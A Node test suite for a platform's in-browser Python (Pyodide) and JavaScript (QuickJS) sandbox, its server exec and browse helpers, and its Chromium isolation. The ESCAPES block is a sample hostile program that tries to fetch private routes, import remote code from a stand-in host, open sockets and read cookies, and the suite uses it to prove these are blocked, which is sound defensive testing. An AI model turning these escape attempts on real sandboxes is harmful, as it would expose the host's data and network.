// The code cap's overlay (docs/CAPABILITIES.md, section 15): the fixed checks (scripts/caps/code.mjs), the overlay's
// paths, the Pyodide route, the Pyodide worker and the QuickJS glue against stand-in engines, and the server helpers
// (lib/platform/exec.ts, browse.ts) against a fake gateway. The real Pyodide and QuickJS packages aren't installed on
// this machine, so their engines are stand-ins here: what runs for real is this overlay's own code. Run from the repo root:
//   npx tsx --test template/scripts/__tests__/caps-code.test.mjs
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import http from "node:http";
import { tmpdir } from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import { fileURLToPath, pathToFileURL } from "node:url";

const TEMPLATE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const OVERLAY = path.join(TEMPLATE, "caps/code");
const CODE = path.join(OVERLAY, "files");
const CORE = path.join(TEMPLATE, "caps/core/files");
const AGENT = path.join(TEMPLATE, "targets/agent/files");
const PAGES = path.resolve(TEMPLATE, "../lib/caps/code/pages");
const modules = path.join(TEMPLATE, "node_modules");
const dirs = [];
after(() => dirs.forEach((d) => rmSync(d, { recursive: true, force: true })));

function walk(dir, base = dir) {
  if (!existsSync(dir)) return [];
  return readdirSync(dir, { withFileTypes: true }).flatMap((e) =>
    e.isDirectory() ? (e.name === "node_modules" ? [] : walk(path.join(dir, e.name), base)) : [path.relative(base, path.join(dir, e.name)).split(path.sep).join("/")],
  );
}

describe("the overlay's files", () => {
  test("write no path the template, a target overlay or another cap overlay writes", () => {
    const own = walk(CODE);
    const others = [
      ...walk(TEMPLATE).filter((f) => !f.startsWith("targets/") && !f.startsWith("caps/")),
      ...readdirSync(path.join(TEMPLATE, "targets")).flatMap((t) => walk(path.join(TEMPLATE, "targets", t, "files"))),
      ...readdirSync(path.join(TEMPLATE, "caps")).filter((c) => c !== "code").flatMap((c) => walk(path.join(TEMPLATE, "caps", c, "files"))),
    ];
    assert.deepEqual(own.filter((f) => others.includes(f)), []);
  });

  test("are all platform files, with exact versions for their dependencies", () => {
    assert.deepEqual(JSON.parse(readFileSync(path.join(OVERLAY, "platform-files.json"), "utf8")).sort(), walk(CODE).sort());
    const deps = JSON.parse(readFileSync(path.join(OVERLAY, "deps.json"), "utf8"));
    assert.deepEqual(Object.keys(deps.dependencies).sort(), ["@jitl/quickjs-singlefile-browser-release-sync", "pyodide", "quickjs-emscripten-core"]);
    for (const v of Object.values(deps.dependencies)) assert.match(v, /^\d+\.\d+\.\d+$/);
    assert.deepEqual(deps.devDependencies, {});
  });

  test("serve Pyodide as static files in public/, copied from the package, never through a function route", async () => {
    assert.ok(!walk(CODE).some((f) => f.startsWith("app/api/")), "no route of the overlay's own serves Pyodide");
    const copies = JSON.parse(readFileSync(path.join(OVERLAY, "copies.json"), "utf8")).copies;
    const helper = readFileSync(path.join(CODE, "lib/platform/pyodide.ts"), "utf8");
    const files = JSON.parse(helper.match(/PYODIDE_FILES = (\[[^\]]+\])/)[1]);
    const where = helper.match(/PYODIDE_PATH = "([^"]+)"/)[1];
    assert.equal(where, "/musemuse/pyodide/");
    assert.deepEqual(copies, files.map((f) => [`node_modules/pyodide/${f}`, `public${where}${f}`]));
    const checker = await import(pathToFileURL(path.join(CODE, "scripts/caps/code.mjs")).href);
    assert.deepEqual(checker.PYODIDE_FILES, files);
    // The live check loads the folder's marker on the live link (lib/caps/live.ts).
    assert.deepEqual(JSON.parse(readFileSync(path.join(CODE, "public/musemuse/pyodide/health.json"), "utf8")).ok, true);
    assert.match(readFileSync(path.resolve(TEMPLATE, "../lib/caps/live.ts"), "utf8"), /code: \[\{ path: "\/musemuse\/pyodide\/health\.json"/);
  });

  test("the skill names every helper the build prompt names, and nothing has an em dash", () => {
    const skill = readFileSync(path.join(CODE, ".agents/skills/muse-code-run/SKILL.md"), "utf8");
    for (const name of ["runPython", "preloadPython", "runJavaScript", "runOnServer", "openPage", "CodeOutput", "CodeRun", "codeFixture", "expectInPageRun", "expectExecOutput", "expectBrowsePage", "sign_in_required", "simulated: true", "INPUT"]) {
      assert.ok(skill.includes(name), name);
    }
    for (const f of walk(CODE)) assert.ok(!readFileSync(path.join(CODE, f), "utf8").includes("—"), f);
  });

  test("the test helper's sample marker matches every recorded page the gateway hands a build", () => {
    const helper = readFileSync(path.join(CODE, "tests/caps/code.ts"), "utf8");
    const marker = new RegExp(helper.match(/SAMPLE_PAGE_MARKER = \/(.+)\/;/)[1]);
    const pages = readdirSync(PAGES).filter((f) => f.endsWith(".json"));
    assert.ok(pages.length >= 3);
    for (const f of pages) {
      const page = JSON.parse(readFileSync(path.join(PAGES, f), "utf8"));
      assert.match(page.text, marker, f);
      assert.ok(page.text.includes(page.marker), f);
    }
  });
});

describe("the fixed checks (scripts/caps/code.mjs)", () => {
  let checker;
  before(async () => {
    checker = await import(pathToFileURL(path.join(CODE, "scripts/caps/code.mjs")).href);
  });
  const all = { "brief:pyodide": 1, "brief:exec": 1, "brief:browse": 1, exec: 2, execOk: 1, browse: 1 };
  const passed = { cap: "code", checks: [{ id: "in-page", ok: true, detail: "ran" }, { id: "exec-output", ok: true, detail: "shows" }, { id: "browse-page", ok: true, detail: "shows" }] };
  /** A product whose static Pyodide files are the installed package's, byte for byte. */
  let root;
  before(() => {
    root = mkdtempSync(path.join(tmpdir(), "mm-code-check-"));
    dirs.push(root);
    for (const f of checker.PYODIDE_FILES) {
      for (const d of ["node_modules/pyodide", "public/musemuse/pyodide"]) {
        mkdirSync(path.join(root, d), { recursive: true });
        writeFileSync(path.join(root, d, f), `bytes of ${f}`);
      }
    }
  });

  test("pass when the page showed each run and the gateway saw the server run and the page", async () => {
    const out = await checker.check({ record: passed, proof: all, root });
    assert.deepEqual(out.map((c) => [c.id, c.ok]), [["in-page", true], ["pyodide-files", true], ["exec-output", true], ["browse-page", true]]);
    assert.match(out[2].detail, /1 finished run/);
  });

  test("fail pyodide-files when the static copies are missing or aren't the installed package's", async () => {
    const other = mkdtempSync(path.join(tmpdir(), "mm-code-check-"));
    dirs.push(other);
    cpSync(root, other, { recursive: true });
    rmSync(path.join(other, "public/musemuse/pyodide/pyodide.asm.wasm"));
    writeFileSync(path.join(other, "public/musemuse/pyodide/pyodide.mjs"), "changed");
    const out = await checker.check({ record: passed, proof: { "brief:pyodide": 1 }, root: other });
    const files = out.find((c) => c.id === "pyodide-files");
    assert.equal(files.ok, false);
    assert.match(files.detail, /pyodide\.mjs, pyodide\.asm\.wasm/);
    assert.equal((await checker.check({ record: passed, proof: { "brief:quickjs": 1 }, root: other })).some((c) => c.id === "pyodide-files"), false, "only for a brief with pyodide");
  });

  test("check only what the brief asked for, from the gateway's record", async () => {
    const out = await checker.check({ record: passed, proof: { "brief:quickjs": 1 } });
    assert.deepEqual(out.map((c) => c.id), ["in-page"]);
  });

  test("fail with no gateway record, a brief that asks for nothing, or a smoke test that skipped a helper", async () => {
    assert.deepEqual((await checker.check({ record: passed, proof: null })).map((c) => [c.id, c.ok]), [["brief", false]]);
    assert.deepEqual((await checker.check({ record: passed, proof: { exec: 3 } })).map((c) => [c.id, c.ok]), [["brief", false]]);
    const idle = await checker.check({ record: { checks: [] }, proof: all });
    assert.ok(idle.every((c) => !c.ok));
    assert.match(idle[0].detail, /expectInPageRun/);
  });

  test("fail a run the page claims when the gateway saw none finish, or no page handed out", async () => {
    const out = await checker.check({ record: passed, proof: { ...all, execOk: 0, browse: 0 }, root });
    assert.deepEqual(out.filter((c) => !c.ok).map((c) => c.id), ["exec-output", "browse-page"]);
    assert.match(out.find((c) => c.id === "exec-output").detail, /no program finish/);
  });
});

/** Runs TypeScript or JavaScript with tsx in `cwd`, and gives its last line as JSON. */
function runIn(cwd, file, code, env = {}) {
  const script = path.join(cwd, file);
  writeFileSync(script, `${code}\n`);
  const tsx = fileURLToPath(import.meta.resolve("tsx/esm"));
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, ["--import", tsx, script], { cwd, env: { ...process.env, ...env } });
    let out = "";
    let err = "";
    child.stdout.on("data", (c) => (out += c));
    child.stderr.on("data", (c) => (err += c));
    child.on("close", (status) => (status === 0 ? resolve(JSON.parse(out.trim().split("\n").at(-1))) : reject(new Error(err || out))));
  });
}

describe("in a product with core and code", { skip: existsSync(modules) ? false : "needs template/node_modules" }, () => {
  let dir;
  let server;
  let base;
  const seen = [];
  let answer = () => ({ status: 200, body: {} });

  before(async () => {
    dir = mkdtempSync(path.join(tmpdir(), "mm-code-product-"));
    dirs.push(dir);
    for (const f of ["tsconfig.json", "package.json"]) cpSync(path.join(TEMPLATE, f), path.join(dir, f));
    cpSync(path.join(TEMPLATE, "lib"), path.join(dir, "lib"), { recursive: true });
    cpSync(path.join(TEMPLATE, "tests"), path.join(dir, "tests"), { recursive: true });
    cpSync(CORE, dir, { recursive: true });
    cpSync(CODE, dir, { recursive: true });
    // The template's packages, plus stand-ins for the QuickJS packages this machine doesn't have.
    mkdirSync(path.join(dir, "node_modules"));
    for (const name of readdirSync(modules)) symlinkSync(path.join(modules, name), path.join(dir, "node_modules", name));
    const fake = (name, source) => {
      const at = path.join(dir, "node_modules", name);
      mkdirSync(at, { recursive: true });
      writeFileSync(path.join(at, "package.json"), JSON.stringify({ name, type: "module", main: "index.js", exports: { ".": "./index.js" } }));
      writeFileSync(path.join(at, "index.js"), source);
    };
    rmSync(path.join(dir, "node_modules", "@jitl"), { recursive: true, force: true });
    fake("@jitl/quickjs-singlefile-browser-release-sync", "export default { type: 'stand-in' };\n");
    fake(
      "quickjs-emscripten-core",
      "export const shouldInterruptAfterDeadline = (d) => () => Date.now() >= d;\nexport const newQuickJSWASMModuleFromVariant = async () => { throw new Error('a test passes its own engine'); };\n",
    );
    server = http.createServer((req, res) => {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", () => {
        seen.push({ method: req.method, url: req.url, headers: req.headers, body: body ? JSON.parse(body) : null });
        const a = answer(req);
        res.writeHead(a.status, { "content-type": "application/json" });
        res.end(JSON.stringify(a.body));
      });
    });
    await new Promise((r) => server.listen(0, "127.0.0.1", r));
    base = `http://127.0.0.1:${server.address().port}/api/gateway`;
  });
  after(() => server?.close());

  const run = (code) => runIn(dir, `run-${Math.random().toString(36).slice(2)}.mts`, code, { GATEWAY_URL: base, PRODUCT_TOKEN: "mm_build_sample_token_value" });
  const COOKIES = "mm_vid=visitor_abcdefghijklmnop; mm_owner=os1.p.s.9999999999999.sig_sig_sig_sig";

  test("runOnServer posts the program with the token and who is asking, and gives back a CodeRun", async () => {
    seen.length = 0;
    answer = () => ({ status: 200, body: { status: "ok", exitCode: 0, stdout: "45\n", stderr: "", truncated: false, ms: 31 } });
    const out = await run(`
import { runOnServer } from "./lib/platform/exec.ts";
const request = new Request("http://localhost/x", { headers: { cookie: ${JSON.stringify(COOKIES)}, "x-forwarded-for": "203.0.113.9" } });
console.log(JSON.stringify(await runOnServer(request, { language: "python", code: "print(45)", files: [{ name: "a.csv", text: "1" }] })));
`);
    assert.deepEqual(out, { runtime: "exec", status: "ok", exitCode: 0, stdout: "45\n", stderr: "", truncated: false, ms: 31 });
    assert.equal(seen[0].url, "/api/gateway/exec");
    assert.equal(seen[0].headers.authorization, "Bearer mm_build_sample_token_value");
    assert.equal(seen[0].headers["x-musemuse-owner"], "os1.p.s.9999999999999.sig_sig_sig_sig");
    assert.equal(seen[0].headers["x-musemuse-client-ip"], "203.0.113.9");
    assert.deepEqual(seen[0].body, { language: "python", code: "print(45)", files: [{ name: "a.csv", text: "1" }] });
  });

  test("a refusal is a CapError with the gateway's code and words, from both helpers", async () => {
    seen.length = 0;
    answer = () => ({ status: 403, body: { error: { code: "sign_in_required", message: "Only the product's owner can use this." } } });
    const out = await run(`
import { CapError, runOnServer } from "./lib/platform/exec.ts";
import { openPage } from "./lib/platform/browse.ts";
const caught = async (p) => { try { await p; return null; } catch (e) { return { isCapError: e instanceof CapError, code: e.code, status: e.status, message: e.message }; } };
const request = new Request("http://localhost/x");
console.log(JSON.stringify({ exec: await caught(runOnServer(request, { language: "node", code: "1" })), page: await caught(openPage(request, { url: "example.org", input: "open example.org" })) }));
`);
    assert.deepEqual(out.exec, { isCapError: true, code: "sign_in_required", status: 403, message: "Only the product's owner can use this." });
    assert.deepEqual(out.page, out.exec);
    assert.deepEqual(seen.map((s) => s.url), ["/api/gateway/exec", "/api/gateway/browse"]);
  });

  test("openPage sends the address, what the person typed and the steps, and keeps simulated", async () => {
    seen.length = 0;
    answer = () => ({ status: 200, body: { url: "https://example.org/", title: "Sample", text: "Sample page (mm-sample-page-2)", screenshot: "data:image/svg+xml;base64,AA==", simulated: true } });
    const out = await run(`
import { openPage } from "./lib/platform/browse.ts";
console.log(JSON.stringify(await openPage(new Request("http://localhost/x"), { url: "https://example.org/", input: "summarize example.org", actions: [{ type: "wait", ms: 100 }] })));
`);
    assert.equal(out.simulated, true);
    assert.equal(out.title, "Sample");
    assert.deepEqual(seen[0].body, { url: "https://example.org/", input: "summarize example.org", actions: [{ type: "wait", ms: 100 }] });
  });

  test("the Pyodide worker loads only from the bytes it was handed, then seals its scope before any program runs", async () => {
    // Stand-ins for Pyodide's files. pyodide.mjs runs each "program" as JavaScript in the worker's own scope, so what a
    // program could reach there is what these runs report.
    const standIn = `export async function loadPyodide(config) {
  const wasm = await (await fetch(config.indexURL + "pyodide.asm.wasm")).text();
  let other = "refused";
  try { await fetch("https://elsewhere.example/x"); other = "fetched"; } catch {}
  const mod = await config.createPyodideModule({});
  let out = null, err = null, stdin = null, made = 0, destroyed = 0;
  globalThis.__config = { indexURL: config.indexURL, lock: typeof config.lockFileContents, stdLibURL: config.stdLibURL, jsglobals: Object.keys(config.jsglobals), jsHasFetch: "fetch" in config.jsglobals, mod: mod.name, wasm, other };
  return {
    setStdout: (o) => { out = o.batched; }, setStderr: (o) => { err = o.batched; }, setStdin: (o) => { stdin = o.stdin; },
    globals: { get: () => () => ({ n: ++made, destroy: () => { destroyed++; } }) },
    async runPythonAsync(code, { globals }) {
      if (code === "raise") throw new Error("Traceback: ValueError: bad");
      if (code === "reach") { for (const name of ["fetch", "WebSocket", "BroadcastChannel", "navigator", "postMessage", "importScripts"]) out(name + " " + typeof globalThis[name] + " " + new Function("return typeof " + name)()); return; }
      for (const line of code.split("\\n")) if (line.startsWith("print:")) out(line.slice(6));
      if (code.includes("input")) { out("read " + JSON.stringify(stdin())); out("then " + JSON.stringify(stdin())); }
      out("globals " + globals.n + " destroyed " + destroyed);
    },
  };
}
`;
    const out = await run(`
import { SEALED_NAMES, WORKER_SOURCE } from "./lib/platform/pyodide.ts";
const replies = [];
// What a worker has: self, postMessage, Blob and object URLs. Node can't import a blob: URL, so an object URL here is
// a data: URL of the same bytes.
globalThis.self = globalThis;
globalThis.postMessage = (m) => replies.push(m);
globalThis.Blob = class { constructor(parts, opts) { this.bytes = Buffer.from(parts[0]); this.type = opts?.type; } };
URL.createObjectURL = (b) => "data:text/javascript;base64," + b.bytes.toString("base64");
await import("data:text/javascript;base64," + Buffer.from(WORKER_SOURCE).toString("base64"));
const enc = (t) => new TextEncoder().encode(t).buffer;
const files = { "pyodide.mjs": enc(${JSON.stringify(standIn)}), "pyodide.asm.mjs": enc("export default async () => ({ name: 'asm stand-in' });"), "pyodide.asm.wasm": enc("WASM BYTES"), "python_stdlib.zip": enc("ZIP"), "pyodide-lock.json": enc("{}") };
const send = (data) => self.onmessage({ data });
await send({ id: 1, kind: "load", files });
await send({ id: 2, kind: "run", code: "print:hello\\nprint:world\\ninput", stdin: "3\\n4" });
await send({ id: 3, kind: "run", code: "print:again", stdin: "" });
await send({ id: 4, kind: "run", code: "raise", stdin: "" });
await send({ id: 5, kind: "run", code: "reach", stdin: "" });
console.log(JSON.stringify({ config: globalThis.__config, sealed: SEALED_NAMES, replies: replies.map(({ ms, ...r }) => r) }));
`);
    assert.deepEqual(out.replies[0], { mm: "pyodide", id: 1, ok: true }, JSON.stringify(out.replies[0]));
    assert.deepEqual(out.config, { indexURL: "https://pyodide.invalid/", lock: "string", stdLibURL: "https://pyodide.invalid/python_stdlib.zip", jsglobals: [], jsHasFetch: false, mod: "asm stand-in", wasm: "WASM BYTES", other: "refused" });
    const [load, first, second, bad, reach] = out.replies;
    assert.deepEqual(load, { mm: "pyodide", id: 1, ok: true });
    assert.equal(first.stdout, 'hello\nworld\nread "3\\n4"\nthen null\nglobals 1 destroyed 0\n');
    assert.equal(second.stdout, "again\nglobals 2 destroyed 1\n", "a fresh dict each run, the last one destroyed");
    assert.equal(bad.ok, false);
    assert.match(bad.stderr, /ValueError: bad/);
    // After load, nothing a program can name or reach through the Function constructor is left of these.
    for (const name of ["fetch", "WebSocket", "BroadcastChannel", "navigator", "postMessage", "importScripts"]) {
      assert.ok(out.sealed.includes(name), name);
      assert.match(reach.stdout, new RegExp(`^${name} undefined undefined$`, "m"), name);
    }
  });

  test("runJavaScript gives the program console and INPUT only, catches its errors, and says when it ran out of time", async () => {
    // A stand-in engine with QuickJS's shape: handles hold values, and evalCode runs the code with the console and INPUT
    // the helper set on the global object, then asks the interrupt handler, as QuickJS does while it runs.
    const out = await run(`
import { runJavaScript } from "./lib/platform/quickjs.ts";
globalThis.window = globalThis;
const h = (value) => ({ value, dispose() {} });
let limits = {};
const engine = {
  newRuntime() {
    let interrupt = () => false;
    return {
      setMemoryLimit: (n) => { limits.memory = n; }, setMaxStackSize: (n) => { limits.stack = n; },
      setInterruptHandler: (fn) => { interrupt = fn; }, executePendingJobs: () => ({ value: 0 }), dispose() {},
      newContext() {
        const global = h({});
        return {
          global, dispose() {},
          newObject: () => h({}), newString: (s) => h(s),
          newFunction: (name, fn) => h(fn),
          setProp: (target, key, value) => { target.value[key] = value.value; },
          dump: (x) => x.value,
          evalCode(code) {
            const g = global.value;
            const consoleShim = Object.fromEntries(Object.entries(g.console).map(([k, fn]) => [k, (...a) => fn(...a.map(h))]));
            try {
              new Function("console", "INPUT", "window", "fetch", code)(consoleShim, g.INPUT, undefined, undefined);
              if (interrupt()) return { error: h({ name: "InternalError", message: "interrupted" }) };
              return { value: h(undefined) };
            } catch (e) {
              return { error: h({ name: e.name, message: e.message }) };
            }
          },
        };
      },
    };
  },
};
const ok = await runJavaScript("console.log('sum', 1 + 2, { a: 1 }); console.error('careful'); console.log(INPUT.toUpperCase()); console.log(typeof window, typeof fetch)", { stdin: "hi" }, engine);
const bad = await runJavaScript("throw new TypeError('nope')", {}, engine);
const slow = await runJavaScript("const until = Date.now() + 150; while (Date.now() < until) {}", { timeoutMs: 100 }, engine);
console.log(JSON.stringify({ ok, bad, slow, limits, notes: globalThis.__musemuseCode }));
`);
    assert.equal(out.ok.status, "ok");
    assert.equal(out.ok.stdout, 'sum 3 {"a":1}\nHI\nundefined undefined\n');
    assert.equal(out.ok.stderr, "careful\n");
    assert.equal(out.bad.status, "error");
    assert.match(out.bad.stderr, /TypeError: nope/);
    assert.equal(out.slow.status, "timeout");
    assert.match(out.slow.stderr, /stopped after 0.1 seconds/);
    assert.deepEqual(out.limits, { memory: 64 * 1024 * 1024, stack: 1024 * 1024 });
    assert.equal(out.notes.quickjs, 3);
    assert.equal(out.notes.last.status, "timeout");
  });

  test("the fixture's output is exactly what Python and Node print for it", async () => {
    const out = await run(`
import { codeFixture } from "./tests/caps/code.ts";
const py = codeFixture("python");
const js = codeFixture("javascript");
let printed = "";
new Function("console", js.code)({ log: (...a) => { printed = a.join(" "); } });
console.log(JSON.stringify({ py, js, printed }));
`).catch((err) => {
      // tests/caps/code.ts imports @playwright/test, which the template has; a machine without it can't run this one.
      if (/playwright/i.test(String(err))) return null;
      throw err;
    });
    if (!out) return;
    assert.equal(out.printed, out.js.stdout);
    const n = Number(out.py.code.match(/n = (\d+)/)[1]);
    assert.equal(out.py.stdout, `mm-fixture ${(n * (n - 1)) / 2} ${n * n}`);
  });
});

// ---------------------------------------------------------------------------------------------------------------
// In Chromium: the sealed frame Python runs in

const playwright = existsSync(modules) ? await import("@playwright/test").catch(() => null) : null;
const esbuild = await import("esbuild").catch(() => null);
let browserProblem = !playwright ? "template/node_modules isn't installed" : !esbuild ? "esbuild isn't installed" : null;
let browser = null;
if (!browserProblem) {
  browser = await playwright.chromium.launch().catch((err) => {
    browserProblem = `Playwright's Chromium didn't start (${String(err?.message ?? err).split("\n")[0]})`;
    return null;
  });
}
after(async () => {
  await browser?.close();
});

/** lib/platform/pyodide.ts for the browser, with its "@/lib/platform/..." imports from the overlay. */
async function bundlePyodide() {
  const out = await esbuild.build({
    stdin: { contents: `import { preloadPython, runPython } from "./pyodide.ts"; window.Py = { preloadPython, runPython };`, resolveDir: path.join(CODE, "lib/platform"), loader: "ts" },
    bundle: true,
    write: false,
    format: "iife",
    target: "es2022",
    logLevel: "silent",
    plugins: [{ name: "at", setup: (b) => b.onResolve({ filter: /^@\// }, (a) => ({ path: path.join(CODE, `${a.path.slice(2)}.ts`) })) }],
  });
  return out.outputFiles[0].text;
}

/** A stand-in pyodide.mjs whose "Python" is JavaScript run in the worker's own scope, after the worker sealed it. */
const BROWSER_STAND_IN = `export async function loadPyodide(config) {
  const wasm = await (await fetch(config.indexURL + "pyodide.asm.wasm")).text();
  await config.createPyodideModule({});
  let out = () => {};
  return {
    setStdout: (o) => { out = o.batched; }, setStderr: () => {}, setStdin: () => {},
    globals: { get: () => () => ({ destroy() {} }) },
    async runPythonAsync(code) {
      const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
      await new AsyncFunction("print", "wasm", code)((s) => out(String(s)), wasm);
    },
  };
}
`;

/** What a hostile program tries, as JavaScript in the worker: every way to the product's routes, its cookies or the network. */
const ESCAPES = `
const tries = {};
const attempt = async (name, fn) => { try { await fn(); tries[name] = "reached"; } catch { tries[name] = "blocked"; } };
await attempt("fetch the product's route", () => fetch("/api/secret"));
await attempt("fetch through the Function constructor", () => new Function("return fetch")()("https://elsewhere.test/a"));
await attempt("XMLHttpRequest", () => { const x = new XMLHttpRequest(); x.open("GET", "https://elsewhere.test/b"); x.send(); });
await attempt("import from a site", () => import("https://elsewhere.test/c.js"));
await attempt("import the product's route", () => import("/api/secret?as=module"));
await attempt("WebSocket", () => new WebSocket("wss://elsewhere.test/d"));
await attempt("EventSource", () => new EventSource("https://elsewhere.test/e"));
await attempt("indexedDB", () => indexedDB.open("x"));
await attempt("a nested worker", () => new Worker("https://elsewhere.test/f.js"));
await attempt("the page's cookies", () => { if (typeof document === "undefined") throw new Error("no document"); return document.cookie; });
await new Promise((r) => setTimeout(r, 300));
print(JSON.stringify({ origin: self.origin, tries }));
`;

describe("Python in the browser, in Chromium", { skip: browserProblem ?? false }, () => {
  let context;
  let page;
  const hits = [];

  before(async () => {
    const js = await bundlePyodide();
    const files = {
      "pyodide.mjs": BROWSER_STAND_IN,
      "pyodide.asm.mjs": "export default async () => ({});",
      "pyodide.asm.wasm": "WASM",
      "python_stdlib.zip": "ZIP",
      "pyodide-lock.json": "{}",
    };
    context = await browser.newContext();
    await context.addCookies([{ name: "mm_vid", value: "visitor_secret_cookie", domain: "code.test", path: "/", secure: true, sameSite: "Lax" }]);
    await context.route("https://code.test/**", (route) => {
      const url = new URL(route.request().url());
      if (url.pathname === "/") return route.fulfill({ contentType: "text/html", body: `<!doctype html><meta charset=utf-8><body><script>${js}</script>` });
      if (url.pathname.startsWith("/musemuse/pyodide/")) {
        const name = url.pathname.slice("/musemuse/pyodide/".length);
        return files[name] !== undefined ? route.fulfill({ contentType: "application/octet-stream", body: files[name] }) : route.fulfill({ status: 404, body: "" });
      }
      hits.push({ url: url.href, cookie: route.request().headers().cookie ?? null });
      return route.fulfill({ contentType: "text/javascript", body: "export {};" });
    });
    await context.route("https://elsewhere.test/**", (route) => {
      hits.push({ url: route.request().url(), cookie: null });
      return route.fulfill({ contentType: "text/javascript", body: "export {};" });
    });
    page = await context.newPage();
    await page.goto("https://code.test/");
  });
  after(async () => {
    await context?.close();
  });

  test("routes the page's and a plain worker's requests here, so a request from the frame would be seen", async () => {
    hits.length = 0;
    await page.evaluate(async () => {
      await fetch("/api/secret?from=page");
      const w = new Worker(URL.createObjectURL(new Blob(['fetch("https://elsewhere.test/control").then(() => postMessage(1), () => postMessage(0))'], { type: "text/javascript" })));
      await new Promise((r) => (w.onmessage = r));
      w.terminate();
    });
    assert.deepEqual(hits.map((h) => h.url), ["https://code.test/api/secret?from=page", "https://elsewhere.test/control"]);
    assert.match(hits[0].cookie ?? "", /mm_vid=visitor_secret_cookie/, "the page's own request carries the cookie");
  });

  test("runs a program sealed off: its own origin, no fetch, no network, no route of the product's, no cookies", async () => {
    hits.length = 0;
    const run = await page.evaluate((code) => window.Py.runPython(code), ESCAPES);
    assert.equal(run.status, "ok", run.stderr);
    const seen = JSON.parse(run.stdout.trim());
    assert.equal(seen.origin, "null", "an opaque origin");
    for (const [name, outcome] of Object.entries(seen.tries)) assert.equal(outcome, "blocked", name);
    assert.deepEqual(hits, [], "no request left the frame");
    assert.equal(await page.evaluate(() => window.__musemuseCode.pyodide), 1);
  });

  test("stops a run past its limit by removing the frame, and the next run starts it again", async () => {
    const slow = await page.evaluate(() => window.Py.runPython("while (true) {}", { timeoutMs: 600 }));
    assert.equal(slow.status, "timeout");
    assert.equal(await page.evaluate(() => document.querySelectorAll("iframe").length), 0);
    const next = await page.evaluate(() => window.Py.runPython("print(1 + 1)"));
    assert.deepEqual([next.status, next.stdout], ["ok", "2\n"]);
    const frame = await page.evaluate(() => {
      const f = document.querySelector("iframe");
      return { sandbox: f.getAttribute("sandbox"), hidden: f.style.display };
    });
    assert.deepEqual(frame, { sandbox: "allow-scripts", hidden: "none" });
  });

  // The real Pyodide, when PYODIDE_TEST_DIR names a folder with its five files (an unpacked pyodide 314.0.7 package).
  test("with the real Pyodide: Python runs, and `from js import fetch` and pyodide.http fail", { skip: process.env.PYODIDE_TEST_DIR ? false : "set PYODIDE_TEST_DIR to an unpacked pyodide package" }, async () => {
    const real = await browser.newContext();
    try {
      await real.route("https://real.test/**", (route) => {
        const url = new URL(route.request().url());
        if (url.pathname === "/") return bundlePyodide().then((js) => route.fulfill({ contentType: "text/html", body: `<!doctype html><meta charset=utf-8><body><script>${js}</script>` }));
        const name = url.pathname.slice("/musemuse/pyodide/".length);
        if (url.pathname.startsWith("/musemuse/pyodide/") && existsSync(path.join(process.env.PYODIDE_TEST_DIR, name))) return route.fulfill({ body: readFileSync(path.join(process.env.PYODIDE_TEST_DIR, name)) });
        hits.push({ url: url.href, cookie: null });
        return route.fulfill({ status: 404, body: "" });
      });
      const p = await real.newPage();
      await p.goto("https://real.test/");
      hits.length = 0;
      const ok = await p.evaluate(() => window.Py.runPython("import sys\nprint(sum(range(10)), sys.version_info[0])\nprint(input())", { stdin: "typed", timeoutMs: 20_000 }));
      assert.equal(ok.status, "ok", ok.stderr);
      assert.equal(ok.stdout, "45 3\ntyped\n");
      const js = await p.evaluate(() => window.Py.runPython("from js import fetch"));
      assert.equal(js.status, "error");
      assert.match(js.stderr, /ImportError|cannot import name 'fetch'/);
      const http = await p.evaluate(() => window.Py.runPython("from pyodide.http import pyfetch\nimport asyncio\nawait pyfetch('/api/secret')"));
      assert.equal(http.status, "error");
      const ffi = await p.evaluate(() => window.Py.runPython("import pyodide_js\nf = pyodide_js.constructor.constructor('return typeof fetch')\nprint(f())"));
      assert.equal(ffi.stdout, "undefined\n", ffi.stderr);
      assert.deepEqual(hits, [], "no request left the frame");
    } finally {
      await real.close();
    }
  });
});
